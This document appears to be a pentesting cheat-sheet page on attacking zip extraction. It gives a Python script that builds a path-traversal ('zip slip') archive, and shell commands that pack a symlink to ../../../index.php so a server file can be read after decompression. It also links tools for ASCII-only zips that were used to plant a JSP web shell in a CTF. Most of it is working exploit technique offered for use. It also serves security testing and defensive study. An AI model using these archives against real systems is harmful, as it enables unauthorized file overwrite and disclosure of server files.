ZIP
===

## Exploit Path Traversal on decompress

Some programs do not check the zip path while extracting the archive.
Then it's possible to exploit this to extract a file to a custom location.

```python
import os
import zipfile

def zip(dst):
  zf = zipfile.ZipFile('%s.zip' % dst, 'w', zipfile.ZIP_DEFLATED)
  zf.writestr('../../../../../../../tmp/test.txt', 'toto')

if __name__ == '__main__':
    zip('test')
```


## Symlink

Upload a link containing a symlink to an other file to access the remote file
after the decompression:

```bash
ln -s ../../../index.php test.txt
zip --symlinks test.zip test.txt
```


## Create zip with [A-Za-z0-9] chars only

Here is two repositories to create a zip file that use only characters in in the
[A-Za-z0-9] ASCII byte range.

- [https://github.com/molnarg/ascii-zip](https://github.com/molnarg/ascii-zip)
- [https://github.com/Arusekk/ascii-zip](https://github.com/Arusekk/ascii-zip)

This can be usefull to create packages (jar, docx, ...) with only "allowed" characters.
This technic is explained here:

- [LiveOverflow - Crazy JSP Web Shell to Exploit Tomcat - Real World CTF 2022](https://www.youtube.com/watch?v=qA8KB6KndrE)
- [rwctf-4th-desperate-cat](https://github.com/voidfyoo/rwctf-4th-desperate-cat/tree/main/writeup)
